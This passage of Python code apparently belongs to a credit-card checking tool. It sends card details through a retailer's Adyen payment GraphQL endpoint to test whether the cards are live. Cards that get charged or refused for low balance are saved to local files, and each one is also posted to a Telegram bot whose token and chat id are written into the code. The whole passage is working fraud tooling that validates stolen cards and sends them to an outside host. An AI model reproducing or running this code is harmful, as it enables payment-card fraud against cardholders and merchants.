            'query': 'mutation AdyenPayment($input: AdyenPaymentInput!) {\n  adyenPayment(input: $input) {\n    action {\n      authorisationToken\n      paymentData\n      paymentMethodType\n      subtype\n      token\n      type\n      method\n      url\n      data {\n        MD\n        PaReq\n        TermUrl\n        __typename\n      }\n      sdkData {\n        client_token\n        payment_method_category\n        __typename\n      }\n      __typename\n    }\n    donationToken\n    pspReference\n    refusalReason\n    refusalReasonCode\n    resultCode\n    transaction {\n      transactionType\n      cardType\n      maskedCardNumber\n      paymentMethodVariant\n      amount\n      __typename\n    }\n    order {\n      amount {\n        currency\n        value\n        __typename\n      }\n      orderData\n      pspReference\n      remainingAmount {\n        currency\n        value\n        __typename\n      }\n      reference\n      expiresAt\n      resultCode\n      __typename\n    }\n    __typename\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        try:
            if "Refused" in response.text:
                refusal_match = re.search(r'"refusalReason"\s*:\s*"([^"]+)"', response.text)
                if refusal_match:
                    msg = refusal_match.group(1)
                    if msg == "Not enough balance":
                        msg = "Not enough balance ✅"
                        with open("funds.txt", "a+") as live_file:
                            live_file.write(f"{ccx}\n")
                        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    Not enough balance ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)
                else:
                    msg = "Unknown refusal reason ❌"

            elif "threeDS2" in response.text:
                msg = "Challenge Required ❌"

            elif "Authorised" in response.text:
                msg = "Thank you for your order ✅"
                with open("live.txt", "a+") as live_file:
                    live_file.write(f"{ccx}\n")
                requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    Charge ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)

            elif "Error " in response.text:
                msg = "Invalid Card ❌"

            else:
                msg = "Unknown Response ❌"

            return msg , ip_data
        except:
            pass
    except Exception as e:
        pass
